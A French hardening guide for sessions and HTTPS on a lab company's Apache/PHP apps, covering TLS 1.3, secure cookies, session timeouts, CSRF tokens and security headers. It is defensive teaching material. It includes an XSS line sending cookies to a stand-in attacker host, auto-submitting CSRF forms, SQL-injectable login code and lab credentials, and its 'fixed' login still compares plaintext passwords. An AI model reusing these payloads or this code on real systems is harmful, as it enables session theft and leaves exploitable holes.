---
id: sessions-https
title: Sessions & HTTPS
sidebar_label: "13. Sessions & HTTPS"
sidebar_position: 13
---

# Sessions & HTTPS

## Introduction

La gestion sécurisée des sessions et la mise en œuvre du protocole HTTPS constituent deux piliers fondamentaux de la sécurité des applications web. Cette section détaille les mécanismes de protection des communications web et de gestion des sessions utilisateurs pour l'infrastructure d'AtlasTech Solutions.

### Contexte et Enjeux

Dans l'infrastructure actuelle d'AtlasTech Solutions, deux applications critiques nécessitent une attention particulière concernant la sécurité des sessions :

**Application Web Commerciale** : Accessible publiquement via Internet, cette application gère les interactions avec les clients et prospects.

**Application CRUD Ressources Humaines** : Application interne manipulant des données hautement sensibles concernant les 24 employés de l'entreprise.

Les sessions permettent de maintenir l'état d'authentification d'un utilisateur entre plusieurs requêtes HTTP. Sans mécanismes de sécurité appropriés, ces sessions deviennent des cibles privilégiées pour les attaquants.

## 1. Transport Layer Security (TLS) 1.3

### 1.1 Comprendre TLS

Le protocole TLS (Transport Layer Security) assure trois objectifs essentiels pour sécuriser les communications entre le navigateur et le serveur web.

**Confidentialité** : Les données échangées sont chiffrées et illisibles pour toute personne interceptant la communication.

**Intégrité** : Les données ne peuvent pas être modifiées durant le transit sans que cela soit détecté.

**Authentification** : Le serveur prouve son identité au client via un certificat numérique.

### 1.2 Pourquoi TLS 1.3

TLS 1.3 représente la version la plus récente et la plus sécurisée du protocole. Comparé aux versions précédentes, TLS 1.3 apporte des améliorations majeures :

**Suppression des algorithmes obsolètes** : Les suites de chiffrement faibles (RC4, 3DES, MD5) ont été complètement retirées.

**Réduction de la latence** : L'établissement de la connexion sécurisée nécessite moins d'allers-retours entre le client et le serveur.

**Chiffrement renforcé** : Seuls les algorithmes de chiffrement modernes et robustes sont autorisés.

### 1.3 Vérification de la Compatibilité

Avant de configurer TLS 1.3, il est nécessaire de vérifier que le serveur dispose d'une version d'OpenSSL compatible.

```bash
openssl version
```

**Résultat attendu** :
```
OpenSSL 1.1.1 ou supérieur
```

**Explication** : OpenSSL est la bibliothèque cryptographique utilisée par Apache pour gérer le chiffrement HTTPS. TLS 1.3 n'est supporté qu'à partir de la version 1.1.1 d'OpenSSL. Si la version affichée est inférieure, une mise à jour du système est nécessaire.

### 1.4 Configuration Apache pour TLS 1.3

#### 1.4.1 Activation du Module SSL

```bash
sudo a2enmod ssl
sudo systemctl restart apache2
```

**Explication** : La commande `a2enmod ssl` active le module SSL/TLS dans Apache. Le redémarrage du service est nécessaire pour prendre en compte cette modification.

#### 1.4.2 Configuration du Virtual Host HTTPS

Édition du fichier de configuration SSL :

```bash
sudo nano /etc/apache2/sites-available/default-ssl.conf
```

**Configuration recommandée** :

```apache
<VirtualHost *:443>
    ServerAdmin webmaster@atlastech.local
    ServerName atlastech.local
    DocumentRoot /var/www/html/atlastech

    # Activation SSL
    SSLEngine on
    
    # Chemins des certificats
    SSLCertificateFile /etc/ssl/certs/atlastech-certificate.crt
    SSLCertificateKeyFile /etc/ssl/private/atlastech-private.key
    
    # Configuration TLS 1.3
    SSLProtocol -all +TLSv1.3 +TLSv1.2
    
    # Suites de chiffrement recommandées
    SSLCipherSuite TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256
    SSLHonorCipherOrder off
    
    # Configuration avancée
    SSLCompression off
    SSLSessionTickets off
    
    # Logs
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

**Explication détaillée des directives** :

**SSLProtocol -all +TLSv1.3 +TLSv1.2** : Cette directive désactive tous les protocoles (-all) puis active uniquement TLS 1.3 et TLS 1.2. TLS 1.2 est conservé pour assurer la compatibilité avec les anciens navigateurs.

**SSLCipherSuite** : Liste les algorithmes de chiffrement autorisés. Les trois algorithmes spécifiés sont les plus robustes disponibles avec TLS 1.3.

**SSLHonorCipherOrder off** : Avec TLS 1.3, cette directive est désactivée car le client et le serveur négocient automatiquement le meilleur algorithme.

**SSLCompression off** : Désactive la compression SSL pour éviter l'attaque CRIME.

**SSLSessionTickets off** : Désactive les tickets de session pour éviter les problèmes de forward secrecy.

#### 1.4.3 Activation du Site et Redirection HTTP vers HTTPS

```bash
sudo a2ensite default-ssl
sudo systemctl reload apache2
```

**Configuration de la redirection automatique** :

Éditer le fichier du Virtual Host HTTP :

```bash
sudo nano /etc/apache2/sites-available/000-default.conf
```

Ajouter la directive de redirection :

```apache
<VirtualHost *:80>
    ServerName atlastech.local
    
    # Redirection automatique vers HTTPS
    Redirect permanent / https://atlastech.local/
    
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

**Explication** : Toute requête HTTP (port 80) est automatiquement redirigée vers la version HTTPS (port 443). L'utilisateur n'a plus la possibilité d'accéder au site en HTTP non sécurisé.

#### 1.4.4 Vérification de la Configuration

```bash
sudo apache2ctl configtest
```

**Résultat attendu** :
```
Syntax OK
```

Si le résultat affiche des erreurs, il faut les corriger avant de redémarrer Apache.

```bash
sudo systemctl restart apache2
```

### 1.5 Test de la Configuration TLS

#### 1.5.1 Test avec OpenSSL

```bash
openssl s_client -connect atlastech.local:443 -tls1_3
```

**Résultat attendu** : La commande doit afficher les détails de la connexion, notamment :

```
Protocol  : TLSv1.3
Cipher    : TLS_AES_256_GCM_SHA384
```

**Explication** : Cette commande établit une connexion HTTPS avec le serveur en forçant l'utilisation de TLS 1.3. Si la connexion réussit et affiche "Protocol : TLSv1.3", la configuration est correcte.

#### 1.5.2 Test avec curl

```bash
curl -vI https://atlastech.local
```

**Analyse de la sortie** : Rechercher les lignes suivantes :

```
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
* Server certificate:
*  subject: CN=atlastech.local
```

### 1.6 Génération d'un Certificat Auto-signé (Environnement de Test)

Pour l'environnement de laboratoire, un certificat auto-signé est suffisant. En production, un certificat émis par une autorité de certification reconnue (Let's Encrypt, DigiCert) serait nécessaire.

```bash
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/ssl/private/atlastech-private.key \
  -out /etc/ssl/certs/atlastech-certificate.crt
```

**Remplissage des informations du certificat** :

```
Country Name: MA
State or Province Name: Fes-Meknes
Locality Name: Meknes
Organization Name: AtlasTech Solutions
Organizational Unit Name: IT Security Division
Common Name: atlastech.local
Email Address: admin@atlastech.ma
```

**Explication** : Cette commande génère une paire de clés (clé privée + certificat public) valable 365 jours. Le Common Name (CN) doit correspondre exactement au nom de domaine du serveur.

**Sécurisation des permissions** :

```bash
sudo chmod 600 /etc/ssl/private/atlastech-private.key
sudo chmod 644 /etc/ssl/certs/atlastech-certificate.crt
```

**Explication** : La clé privée doit être protégée avec des permissions restrictives (600 = lecture/écriture uniquement pour root). Le certificat public peut être lisible par tous.

---

## 2. Cookies Sécurisés

### 2.1 Comprendre les Cookies

Un cookie est un petit fichier texte stocké par le navigateur et renvoyé automatiquement au serveur lors de chaque requête. Les cookies sont utilisés pour maintenir l'état de la session utilisateur.

**Problématique de sécurité** : Sans protection appropriée, les cookies peuvent être interceptés ou manipulés par des attaquants.

### 2.2 Attributs de Sécurité des Cookies

#### 2.2.1 Attribut HttpOnly

**Objectif** : Empêcher l'accès au cookie via JavaScript côté client.

**Protection contre** : Attaques XSS (Cross-Site Scripting).

**Exemple d'attaque sans HttpOnly** :

Un attaquant injecte du code JavaScript malveillant dans l'application :

```javascript
<script>
  fetch('https://attaquant.com/steal?cookie=' + document.cookie);
</script>
```

Si le cookie de session n'a pas l'attribut HttpOnly, le code JavaScript peut lire le cookie et l'envoyer à l'attaquant.

**Configuration PHP pour HttpOnly** :

Dans le fichier `login.php`, la ligne suivante est vulnérable :

```php
setcookie('user_session', $user['utilisateur'], time() + 86400, '/');
```

**Correction sécurisée** :

```php
setcookie('user_session', $user['utilisateur'], [
    'expires' => time() + 86400,
    'path' => '/',
    'domain' => 'atlastech.local',
    'secure' => true,      // HTTPS uniquement
    'httponly' => true,    // Inaccessible en JavaScript
    'samesite' => 'Strict' // Protection CSRF
]);
```

**Vérification de la configuration** :

Ouvrir les outils de développement du navigateur (F12), onglet "Application" > "Cookies". Le cookie doit afficher :

```
HttpOnly: true
Secure: true
SameSite: Strict
```

#### 2.2.2 Attribut Secure

**Objectif** : Forcer la transmission du cookie uniquement via HTTPS.

**Protection contre** : Interception du cookie sur des réseaux non sécurisés.

**Scénario d'attaque sans Secure** :

Un employé se connecte à l'application CRUD depuis un réseau Wi-Fi public. Sans l'attribut Secure, le cookie de session est transmis en clair sur le réseau. Un attaquant utilisant Wireshark peut capturer le cookie et usurper l'identité de l'employé.

**Configuration globale dans php.ini** :

```bash
sudo nano /etc/php/8.1/apache2/php.ini
```

Modifier les directives :

```ini
session.cookie_secure = 1
session.cookie_httponly = 1
session.cookie_samesite = "Strict"
```

Redémarrer Apache :

```bash
sudo systemctl restart apache2
```

#### 2.2.3 Attribut SameSite

**Objectif** : Empêcher l'envoi du cookie lors de requêtes cross-site.

**Protection contre** : Attaques CSRF (Cross-Site Request Forgery).

**Valeurs possibles** :

**Strict** : Le cookie n'est jamais envoyé lors de requêtes cross-site. Recommandé pour les applications sensibles comme le CRUD RH.

**Lax** : Le cookie est envoyé uniquement pour les requêtes GET cross-site. Acceptable pour l'application web commerciale.

**None** : Le cookie est toujours envoyé. Nécessite l'attribut Secure. À éviter sauf besoin spécifique.

### 2.3 Configuration des Sessions PHP

#### 2.3.1 Configuration dans php.ini

```bash
sudo nano /etc/php/8.1/apache2/php.ini
```

**Paramètres de sécurité recommandés** :

```ini
; Nom de session personnalisé (masquer PHP)
session.name = ATLASTECH_SESSION

; Cookies sécurisés
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = "Strict"

; Domaine et chemin
session.cookie_domain = "atlastech.local"
session.cookie_path = "/"

; Durée de vie
session.cookie_lifetime = 0
session.gc_maxlifetime = 3600

; Stockage des sessions
session.save_path = "/var/lib/php/sessions"

; Régénération de l'ID de session
session.use_strict_mode = 1
session.use_only_cookies = 1
session.use_trans_sid = 0
```

**Explication des paramètres** :

**session.name** : Personnalise le nom du cookie de session. Par défaut, PHP utilise "PHPSESSID", ce qui révèle l'utilisation de PHP.

**session.cookie_lifetime = 0** : Le cookie est détruit à la fermeture du navigateur.

**session.gc_maxlifetime = 3600** : La session expire après 3600 secondes (1 heure) d'inactivité.

**session.use_strict_mode = 1** : Refuse les ID de session non initialisés par le serveur (protection contre la fixation de session).

**session.use_only_cookies = 1** : L'ID de session n'est jamais transmis dans l'URL.

**session.use_trans_sid = 0** : Désactive la réécriture automatique des URLs avec l'ID de session.

#### 2.3.2 Vérification de la Configuration

```bash
php -i | grep session
```

**Résultat attendu** : Vérifier que les valeurs correspondent à la configuration définie.

---

## 3. Gestion Sécurisée des Sessions

### 3.1 Analyse de la Vulnérabilité Actuelle

Dans le fichier `login.php` actuel, la gestion de session présente plusieurs faiblesses :

```php
session_start();
include 'config.php';

if (isset($_POST['login'])) {
    $utilisateur = $_POST['utilisateur'];
    $mot_de_passe = $_POST['mot_de_passe'];
    
    // Vulnérabilité SQL Injection
    $query = "SELECT * FROM employes WHERE utilisateur = '$utilisateur' 
              AND mot_de_passe = '$mot_de_passe'";
    $result = mysqli_query($conn, $query);
    
    if (mysqli_num_rows($result) > 0) {
        $user = mysqli_fetch_assoc($result);
        
        // Pas de régénération de l'ID de session
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['is_admin'] = $user['is_admin'];
        $_SESSION['username'] = $user['utilisateur'];
        
        // Cookie non sécurisé
        setcookie('user_session', $user['utilisateur'], time() + 86400, '/');
        
        header("Location: dashboard.php");
        exit;
    }
}
```

**Faiblesses identifiées** :

1. Pas de régénération de l'ID de session après authentification
2. Cookie sans attributs de sécurité
3. Pas de timeout de session
4. Pas de protection contre la fixation de session
5. Injection SQL (traité dans la section 15.2)

### 3.2 Implémentation de la Régénération de Session

#### 3.2.1 Pourquoi Régénérer l'ID de Session

**Attaque par fixation de session** :

1. L'attaquant obtient un ID de session valide du serveur
2. L'attaquant force la victime à utiliser cet ID de session (via lien malveillant)
3. La victime s'authentifie avec cet ID de session
4. L'attaquant peut maintenant accéder au compte de la victime

**Protection** : Régénérer l'ID de session à chaque changement de privilège.

#### 3.2.2 Code Sécurisé pour login.php

```php
<?php
// Démarrage de session sécurisé
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_only_cookies', 1);
ini_set('session.use_strict_mode', 1);

session_start();

include 'config.php';

if (isset($_POST['login'])) {
    $utilisateur = $_POST['utilisateur'];
    $mot_de_passe = $_POST['mot_de_passe'];
    
    // Protection SQL Injection (requête préparée)
    $stmt = $conn->prepare("SELECT * FROM employes WHERE utilisateur = ?");
    $stmt->bind_param("s", $utilisateur);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows > 0) {
        $user = $result->fetch_assoc();
        
        // Vérification du mot de passe (avec bcrypt en production)
        if ($user['mot_de_passe'] === $mot_de_passe) {
            
            // RÉGÉNÉRATION DE L'ID DE SESSION (CRITIQUE)
            session_regenerate_id(true);
            
            // Stockage des informations de session
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['is_admin'] = $user['is_admin'];
            $_SESSION['username'] = $user['utilisateur'];
            $_SESSION['login_time'] = time();
            $_SESSION['last_activity'] = time();
            
            // Cookie sécurisé
            setcookie('user_session', $user['utilisateur'], [
                'expires' => time() + 3600,
                'path' => '/',
                'domain' => 'atlastech.local',
                'secure' => true,
                'httponly' => true,
                'samesite' => 'Strict'
            ]);
            
            // Journalisation de la connexion
            $log_msg = date('Y-m-d H:i:s') . " - Connexion: " . 
                       $user['utilisateur'] . " (IP: " . 
                       $_SERVER['REMOTE_ADDR'] . ")\n";
            file_put_contents('/var/log/atlastech/auth.log', $log_msg, FILE_APPEND);
            
            header("Location: dashboard.php");
            exit;
        } else {
            $error = "Mot de passe incorrect";
        }
    } else {
        $error = "Utilisateur inexistant";
    }
    
    $stmt->close();
}
?>
```

**Explication du code sécurisé** :

**session_regenerate_id(true)** : Génère un nouvel ID de session et supprime l'ancien fichier de session. Le paramètre `true` est essentiel pour supprimer complètement l'ancienne session.

**$_SESSION['login_time']** : Enregistre l'heure de connexion pour permettre une expiration absolue de la session.

**$_SESSION['last_activity']** : Enregistre l'heure de la dernière activité pour implémenter un timeout d'inactivité.

**Journalisation** : Chaque connexion est enregistrée dans un fichier de log avec l'adresse IP.

### 3.3 Implémentation du Timeout de Session

#### 3.3.1 Création du Fichier session_check.php

Créer un fichier inclus dans toutes les pages protégées :

```php
<?php
// session_check.php

// Démarrage de session sécurisé
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');

session_start();

// Timeout d'inactivité (30 minutes)
$timeout_duration = 1800;

// Timeout absolu (2 heures depuis la connexion)
$max_session_duration = 7200;

// Vérification de l'authentification
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit;
}

// Vérification du timeout absolu
if (isset($_SESSION['login_time'])) {
    $elapsed = time() - $_SESSION['login_time'];
    
    if ($elapsed > $max_session_duration) {
        session_unset();
        session_destroy();
        header("Location: login.php?timeout=absolute");
        exit;
    }
}

// Vérification du timeout d'inactivité
if (isset($_SESSION['last_activity'])) {
    $inactive = time() - $_SESSION['last_activity'];
    
    if ($inactive > $timeout_duration) {
        session_unset();
        session_destroy();
        header("Location: login.php?timeout=inactivity");
        exit;
    }
}

// Mise à jour de l'heure de dernière activité
$_SESSION['last_activity'] = time();

// Régénération périodique de l'ID de session (toutes les 15 minutes)
if (!isset($_SESSION['last_regeneration'])) {
    $_SESSION['last_regeneration'] = time();
} else {
    if (time() - $_SESSION['last_regeneration'] > 900) {
        session_regenerate_id(true);
        $_SESSION['last_regeneration'] = time();
    }
}
?>
```

**Explication des mécanismes de timeout** :

**Timeout d'inactivité** : Si l'utilisateur ne fait aucune requête pendant 30 minutes, la session expire.

**Timeout absolu** : Même si l'utilisateur est actif, la session expire 2 heures après la connexion initiale.

**Régénération périodique** : L'ID de session est régénéré toutes les 15 minutes pour limiter la fenêtre d'exploitation en cas de vol de session.

#### 3.3.2 Intégration dans dashboard.php

Remplacer `session_start();` par :

```php
<?php
require_once 'session_check.php';
include 'config.php';

// Reste du code dashboard.php
?>
```

### 3.4 Déconnexion Sécurisée

Modifier le fichier `logout.php` :

```php
<?php
session_start();

// Récupération de l'utilisateur avant destruction
$username = $_SESSION['username'] ?? 'Unknown';

// Suppression de toutes les variables de session
session_unset();

// Destruction de la session
session_destroy();

// Suppression du cookie de session
setcookie('user_session', '', [
    'expires' => time() - 3600,
    'path' => '/',
    'domain' => 'atlastech.local',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);

// Suppression du cookie de session PHP
if (ini_get("session.use_cookies")) {
    $params = session_get_cookie_params();
    setcookie(session_name(), '', time() - 42000,
        $params["path"], $params["domain"],
        $params["secure"], $params["httponly"]
    );
}

// Journalisation
$log_msg = date('Y-m-d H:i:s') . " - Déconnexion: " . $username . 
           " (IP: " . $_SERVER['REMOTE_ADDR'] . ")\n";
file_put_contents('/var/log/atlastech/auth.log', $log_msg, FILE_APPEND);

// Redirection
header("Location: login.php?logout=success");
exit;
?>
```

**Explication** : Une déconnexion sécurisée nécessite la suppression complète de tous les éléments de session (variables, fichier serveur, cookies).

---

## 4. Protection CSRF avec Tokens

### 4.1 Comprendre l'Attaque CSRF

CSRF (Cross-Site Request Forgery) est une attaque où un utilisateur authentifié exécute involontairement des actions non désirées sur une application web.

**Scénario d'attaque sur l'application CRUD** :

1. Un employé RH est connecté à l'application CRUD
2. L'employé visite un site malveillant (dans un autre onglet)
3. Le site malveillant contient un formulaire caché :

```html
<form action="https://atlastech.local/delete_employee.php" method="POST">
    <input type="hidden" name="id" value="1">
</form>
<script>document.forms[0].submit();</script>
```

4. Le formulaire est automatiquement soumis avec les cookies de session de l'employé
5. L'employé numéro 1 (le Directeur Général) est supprimé sans que l'employé RH ne s'en rende compte

### 4.2 Principe de Protection par Token CSRF

Un token CSRF est une valeur aléatoire générée par le serveur et stockée dans la session. Ce token est inclus dans chaque formulaire et vérifié lors de la soumission.

**Mécanisme** :

1. Le serveur génère un token unique lors de l'affichage du formulaire
2. Le token est inclus comme champ caché dans le formulaire
3. Le token est également stocké dans la session
4. Lors de la soumission, le serveur vérifie que les deux tokens correspondent
5. Si les tokens ne correspondent pas, la requête est rejetée

**Pourquoi cela protège** : Un site malveillant ne peut pas connaître le token CSRF car il est généré aléatoirement et stocké dans la session serveur.

### 4.3 Implémentation de la Protection CSRF

#### 4.3.1 Création du Fichier csrf.php

```php
<?php
// csrf.php - Bibliothèque de gestion des tokens CSRF

class CSRF {
    
    /**
     * Génère un token CSRF et le stocke en session
     */
    public static function generateToken() {
        if (!isset($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }
    
    /**
     * Retourne le champ HTML caché contenant le token
     */
    public static function getTokenField() {
        $token = self::generateToken();
        return '<input type="hidden" name="csrf_token" value="' . 
               htmlspecialchars($token, ENT_QUOTES, 'UTF-8') . '">';
    }
    
    /**
     * Vérifie la validité du token soumis
     */
    public static function verifyToken() {
        if (!isset($_POST['csrf_token']) || !isset($_SESSION['csrf_token'])) {
            return false;
        }
        
        // Comparaison sécurisée (protection timing attack)
        return hash_equals($_SESSION['csrf_token'], $_POST['csrf_token']);
    }
    
    /**
     * Vérifie le token et tue le script si invalide
     */
    public static function validateOrDie() {
        if (!self::verifyToken()) {
            http_response_code(403);
            die('Erreur CSRF: Token invalide ou manquant');
        }
    }
}
?>
```

**Explication des fonctions** :

**generateToken()** : Génère un token aléatoire de 64 caractères hexadécimaux (32 bytes). La fonction `random_bytes()` utilise une source cryptographiquement sécurisée.

**getTokenField()** : Retourne le code HTML d'un champ caché contenant le token. La fonction `htmlspecialchars()` empêche l'injection XSS.

**verifyToken()** : Compare le token soumis avec celui stocké en session. Utilise `hash_equals()` pour éviter les attaques par timing.

**validateOrDie()** : Vérifie le token et arrête l'exécution si invalide.

#### 4.3.2 Protection du Formulaire d'Ajout d'Employé

Modifier `add_employee.php` :

```php
<?php
require_once 'session_check.php';
require_once 'csrf.php';
include 'config.php';

if (isset($_POST['submit'])) {
    // VALIDATION DU TOKEN CSRF
    CSRF::validateOrDie();
    
    // Suite du traitement...
    $utilisateur = $_POST['utilisateur'];
    // ...
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <title>Ajouter un employé - AtlasTech</title>
</head>
<body>
    <form method="POST" action="">
        
        <!-- TOKEN CSRF -->
        <?php echo CSRF::getTokenField(); ?>
        
        <div class="form-group">
            <label>Nom d'utilisateur</label>
            <input type="text" name="utilisateur" required>
        </div>
        
        <!-- Autres champs du formulaire -->
        
        <button type="submit" name="submit">Enregistrer</button>
    </form>
</body>
</html>
```

#### 4.3.3 Protection de Tous les Formulaires

Appliquer la même protection à tous les formulaires de l'application :

**edit_employee.php** :

```php
<?php echo CSRF::getTokenField(); ?>
```

**delete_employee.php** :

```php
<?php
require_once 'session_check.php';
require_once 'csrf.php';

if (isset($_GET['confirm']) && $_GET['confirm'] == 'yes') {
    // Vérification du token CSRF
    if (!isset($_GET['csrf_token']) || 
        !hash_equals($_SESSION['csrf_token'], $_GET['csrf_token'])) {
        die('Erreur CSRF');
    }
    
    // Suite du traitement...
}
?>
```

Pour les liens de suppression, ajouter le token dans l'URL :

```php
<a href="delete_employee.php?id=<?php echo $row['id']; ?>&csrf_token=<?php echo CSRF::generateToken(); ?>" 
   class="delete" onclick="return confirm('Supprimer ?')">Supprimer</a>
```

### 4.4 Protection Double-Submit Cookie (Alternative)

Une alternative au stockage du token en session consiste à utiliser un cookie.

**Principe** :

1. Le serveur génère un token et l'envoie dans un cookie
2. Le même token est inclus dans le formulaire
3. Lors de la soumission, le serveur compare le token du formulaire avec celui du cookie
4. Si les deux correspondent, la requête est légitime

**Implémentation** :

```php
<?php
// Génération du token
$csrf_token = bin2hex(random_bytes(32));

// Stockage dans un cookie
setcookie('csrf_token', $csrf_token, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => 'atlastech.local',
    'secure' => true,
    'httponly' => false,  // JavaScript doit pouvoir lire
    'samesite' => 'Strict'
]);

// Inclusion dans le formulaire
echo '<input type="hidden" name="csrf_token" value="' . $csrf_token . '">';

// Vérification
if ($_COOKIE['csrf_token'] !== $_POST['csrf_token']) {
    die('Erreur CSRF');
}
?>
```

**Avantage** : Ne dépend pas de la session serveur (utile pour les applications stateless).

**Inconvénient** : Le cookie n'a pas l'attribut HttpOnly, donc accessible en JavaScript.

---

## 5. Headers de Sécurité HTTP

Les headers HTTP permettent de renforcer la sécurité de l'application en définissant des politiques de sécurité côté navigateur.

### 5.1 Header Strict-Transport-Security (HSTS)

**Objectif** : Forcer le navigateur à toujours utiliser HTTPS, même si l'utilisateur tape HTTP dans la barre d'adresse.

**Configuration Apache** :

```bash
sudo nano /etc/apache2/sites-available/default-ssl.conf
```

Ajouter dans le VirtualHost :

```apache
<VirtualHost *:443>
    # ... configuration existante ...
    
    # Header HSTS
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
</VirtualHost>
```

**Explication** :

**max-age=31536000** : Le navigateur doit utiliser HTTPS pendant 1 an (31536000 secondes).

**includeSubDomains** : La règle s'applique également aux sous-domaines.

**preload** : Permet l'inscription dans la liste HSTS preload des navigateurs.

**Activation du module headers** :

```bash
sudo a2enmod headers
sudo systemctl restart apache2
```

**Vérification** :

```bash
curl -I https://atlastech.local | grep Strict-Transport-Security
```

**Résultat attendu** :
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### 5.2 Header X-Frame-Options

**Objectif** : Empêcher l'affichage de l'application dans une iframe (protection contre le clickjacking).

**Configuration** :

```apache
Header always set X-Frame-Options "DENY"
```

**Valeurs possibles** :

**DENY** : Interdiction totale d'affichage en iframe.

**SAMEORIGIN** : Autorise l'affichage uniquement si l'iframe provient du même domaine.

**ALLOW-FROM https://trusted.com** : Autorise uniquement le domaine spécifié (obsolète, utiliser CSP à la place).

### 5.3 Header X-Content-Type-Options

**Objectif** : Empêcher le navigateur de "deviner" le type MIME d'un fichier.

**Configuration** :

```apache
Header always set X-Content-Type-Options "nosniff"
```

**Explication** : Sans ce header, un navigateur pourrait interpréter un fichier texte comme du JavaScript, créant une faille XSS.

### 5.4 Header Content-Security-Policy (CSP)

**Objectif** : Définir les sources autorisées pour le chargement de ressources (scripts, styles, images).

**Configuration progressive** :

```apache
# Politique permissive pour commencer
Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; img-src 'self' data:; font-src 'self' https://cdnjs.cloudflare.com"
```

**Explication des directives** :

**default-src 'self'** : Par défaut, autoriser uniquement les ressources du même domaine.

**script-src 'self' 'unsafe-inline'** : Scripts uniquement depuis le même domaine et scripts inline.

**'unsafe-inline'** : Autoriser les scripts/styles inline (dangereux, à éviter en production).

**https://cdnjs.cloudflare.com** : Autoriser le chargement de bibliothèques externes (Font Awesome, etc.).

**Version stricte (production)** :

```apache
Header always set Content-Security-Policy "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
```

### 5.5 Header Referrer-Policy

**Objectif** : Contrôler les informations envoyées dans le header Referer lors de la navigation.

**Configuration** :

```apache
Header always set Referrer-Policy "strict-origin-when-cross-origin"
```

**Valeurs** :

**no-referrer** : Aucune information de référence.

**strict-origin-when-cross-origin** : URL complète pour les requêtes same-origin, uniquement l'origine pour cross-origin.

### 5.6 Header Permissions-Policy

**Objectif** : Contrôler l'accès aux fonctionnalités du navigateur (caméra, microphone, géolocalisation).

**Configuration** :

```apache
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
```

**Explication** : Désactive l'accès à la géolocalisation, au microphone et à la caméra.

### 5.7 Configuration Complète des Headers

Fichier complet `/etc/apache2/sites-available/default-ssl.conf` :

```apache
<VirtualHost *:443>
    ServerAdmin webmaster@atlastech.local
    ServerName atlastech.local
    DocumentRoot /var/www/html/atlastech

    SSLEngine on
    SSLCertificateFile /etc/ssl/certs/atlastech-certificate.crt
    SSLCertificateKeyFile /etc/ssl/private/atlastech-private.key
    SSLProtocol -all +TLSv1.3 +TLSv1.2
    SSLCipherSuite TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256
    SSLHonorCipherOrder off
    SSLCompression off
    SSLSessionTickets off

    # Headers de sécurité
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
    Header always set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; img-src 'self' data:; font-src 'self' https://cdnjs.cloudflare.com"

    # Désactivation de la signature du serveur
    ServerSignature Off
    ServerTokens Prod

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

**Vérification de tous les headers** :

```bash
curl -I https://atlastech.local
```

---

## 6. Tests et Validation

### 6.1 Test de la Configuration HTTPS

#### 6.1.1 Test avec SSLLabs (Online)

Bien que l'environnement soit local, vous pouvez tester la configuration avec `testssl.sh` :

```bash
git clone https://github.com/drwetter/testssl.sh.git
cd testssl.sh
./testssl.sh https://atlastech.local
```

**Analyse du rapport** : Le rapport doit afficher :

```
TLS 1.3: offered
TLS 1.2: offered
TLS 1.1: not offered
TLS 1.0: not offered
```

#### 6.1.2 Vérification des Certificats

```bash
openssl x509 -in /etc/ssl/certs/atlastech-certificate.crt -text -noout
```

**Vérifier** :

- Subject: CN=atlastech.local
- Validity: Not After (date d'expiration)
- Signature Algorithm: sha256WithRSAEncryption

### 6.2 Test des Cookies Sécurisés

#### 6.2.1 Test Manuel dans le Navigateur

1. Ouvrir l'application : `https://atlastech.local/atlastech/login.php`
2. Se connecter avec : `a.haidar` / `DG2024!`
3. Ouvrir les outils de développement (F12)
4. Onglet "Application" > "Cookies"

**Vérifier** :

```
Name: ATLASTECH_SESSION
HttpOnly: true
Secure: true
SameSite: Strict
```

#### 6.2.2 Test Automatisé

```bash
curl -I -k https://atlastech.local/atlastech/login.php
```

**Rechercher** :

```
Set-Cookie: ATLASTECH_SESSION=...; HttpOnly; Secure; SameSite=Strict
```

### 6.3 Test de Protection CSRF

#### 6.3.1 Test de Tentative d'Attaque

Créer un fichier HTML malveillant sur un autre serveur :

```html
<!DOCTYPE html>
<html>
<head>
    <title>Site Malveillant</title>
</head>
<body>
    <h1>Offre Exceptionnelle!</h1>
    
    <!-- Formulaire caché qui tente de supprimer un employé -->
    <form id="csrf-attack" action="https://atlastech.local/atlastech/delete_employee.php" method="POST">
        <input type="hidden" name="id" value="1">
        <input type="hidden" name="confirm" value="yes">
    </form>
    
    <script>
        // Soumission automatique du formulaire
        document.getElementById('csrf-attack').submit();
    </script>
</body>
</html>
```

**Résultat attendu** : La requête doit être bloquée avec l'erreur "Erreur CSRF: Token invalide ou manquant".

#### 6.3.2 Vérification des Logs

```bash
